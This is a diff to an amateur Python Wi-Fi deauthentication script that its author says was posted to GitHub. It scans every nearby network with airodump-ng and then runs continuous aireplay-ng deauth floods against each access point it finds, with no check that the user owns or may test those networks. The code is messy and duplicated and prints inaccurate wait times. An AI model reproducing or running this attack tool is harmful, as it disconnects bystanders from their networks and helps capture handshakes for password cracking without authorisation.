@@ -1,37 +1,28 @@
-import re
 import os
 import time
 import subprocess
 import csv
+import threading
 # random deauth script just put on github for testing its a pretty shit script cause i didn't makeit target 1 network then target the next it will do the same 1 but i will maybe make it do that later
 
-def monmode():
-  global intface
-  print("Running wlan0mon")
-  time.sleep(2)
-  print("killing processes and entering monitor mode")
-  intface = "wlan0mon"
-  subprocess.Popen(["sudo", "airmon-ng", "start", "wlan0mon"],stdout=subprocess.DEVNULL)
-  subprocess.Popen(["sudo", "airmon-ng", "check", "kill"],stdout=subprocess.DEVNULL)
-monmode()
-
-def handshake():
+def rescann():
  os.system("rm -rf pwn-01.csv")
- time.sleep(1)
+ time.sleep(3)
  names = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
  pwn = subprocess.Popen(["sudo", "airodump-ng", "-w", "pwn", "--write-interval", "1", "--output-format", "csv", f"{intface}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
  os.system("clear")
- print("\033[0;42mSCANNING ALL NETWORKS THEN TARGETING... PLEASE WAIT 5seconds...\033[0m")
+ print("\033[0;42mSCANNING ALL NETWORKS THEN TARGETING... PLEASE WAIT 12seconds...\033[0m")
  time.sleep(3) # um
  pwn.terminate()
  seen_essids = set()
  os.system("clear")
+ threading.Thread(target=handshake, daemon=True).start()
  print("\n\033[0;35mPLEASE WAIT... AS SOON AS SSIDS POP UP IT WILL START ATTACKING\n ")
  print("\r                       ALL WIFIS TO ATTACK ")
  print("\r   ATTACKING")
  print("\r\033[0;33m -------------\r")
- time.sleep(1)
- try:
+ time.sleep(3)
+ while True:
    with open("pwn-01.csv", "r") as read_csv:
     sec_read = csv.DictReader(read_csv, names)
     next(sec_read)
@@ -42,18 +33,63 @@ def handshake():
       ch = rows["channel"].strip()
       if essid:
        if essid not in seen_essids:
-        print(f"\033[0;32m{essid}")
-        term = subprocess.Popen(["sudo", "airodump-ng", "-w", essid, "-c", ch, intface], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+        print(f"\033[0;32m{essid}\n")
+        global term,term2
+        term = subprocess.Popen(["sudo", "airodump-ng", "-c", ch, intface], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
         seen_essids.add(essid)
-
         time.sleep(0.022)
         term2 = subprocess.Popen(["sudo", "aireplay-ng", "-0", "0", "-a", mac, intface], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
         time.sleep(0.022)
-        time.sleep(20)
+        time.sleep(8)
         term.terminate()
         term2.terminate()
-        handshake()
- except KeyboardInterrupt:
+
+def monmode():
+  global intface
+  print("Running wlan0mon")
+  intface = "wlan0mon"
+monmode()
+
+def handshake():
+ os.system("rm -rf pwn-01.csv")
+ time.sleep(3)
+ names = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
+ pwn = subprocess.Popen(["sudo", "airodump-ng", "-w", "pwn", "--write-interval", "1", "--output-format", "csv", f"{intface}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+ os.system("clear")
+ print("\033[0;42mSCANNING ALL NETWORKS THEN TARGETING... PLEASE WAIT 12seconds...\033[0m")
+ time.sleep(3) # um
+ pwn.terminate()
+ seen_essids = set()
+ os.system("clear")
+ threading.Thread(target=rescann, daemon=True).start()
+ print("\n\033[0;35mPLEASE WAIT... AS SOON AS SSIDS POP UP IT WILL START ATTACKING\n ")
+ print("\r                       ALL WIFIS TO ATTACK ")
+ print("\r   ATTACKING")
+ print("\r\033[0;33m -------------\r")
+ time.sleep(3)
+ while True:
+  try:
+   with open("pwn-01.csv", "r") as read_csv:
+    sec_read = csv.DictReader(read_csv, names)
+    next(sec_read)
+    for rows in sec_read: 
+      global essid # yes i know its global and not being used global lol just keep it here
+      essid = rows["ESSID"]
+      mac = rows["BSSID"].strip()
+      ch = rows["channel"].strip()
+      if essid:
+       if essid not in seen_essids:
+        print(f"\033[0;32m{essid}\n")
+        global term,term2
+        term = subprocess.Popen(["sudo", "airodump-ng", "-c", ch, intface], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+        seen_essids.add(essid)
+        time.sleep(0.022)
+        term2 = subprocess.Popen(["sudo", "aireplay-ng", "-0", "0", "-a", mac, intface], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+        time.sleep(0.022)
+        time.sleep(8)
+        term.terminate()
+        term2.terminate()
+  except KeyboardInterrupt:
    exit()
 handshake()
     
